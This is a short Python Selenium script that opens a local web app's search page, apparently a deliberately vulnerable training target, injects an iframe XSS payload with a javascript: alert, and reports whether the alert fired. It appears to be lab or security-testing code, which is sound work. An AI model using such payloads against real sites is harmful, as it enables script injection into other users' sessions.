from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.alert import Alert
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC


def inject_XSS():
    #create payload and url 
    url = "http://localhost:3000/#/search"
    payload = '<iframe src="javascript:alert(`xss`)">'

    #establish session
    driver = webdriver.Firefox(options=webdriver.FirefoxOptions())
    driver.get(url)
    #initialize actions driver
    action = ActionChains(driver)

    #close intial pop up
    action.send_keys(Keys.ESCAPE).perform()
    try:
        #find search bar
        search_box = WebDriverWait(driver, 3).until(EC.presence_of_element_located((By.ID, "searchQuery")))
        #inject the query    
        search_box.send_keys(Keys.RETURN)
        search_box.send_keys(payload)
        action.send_keys(Keys.ENTER).perform()
        #detect whether the injected js alert worked
        try:
            #try this if it worked and notify
            alert = driver.switch_to.alert
            alert.accept()
            print("XSS injection successful")
        except:
            #else it did not work
            print("No vulnerability")
    except:
        print("Object unreachable")


inject_XSS()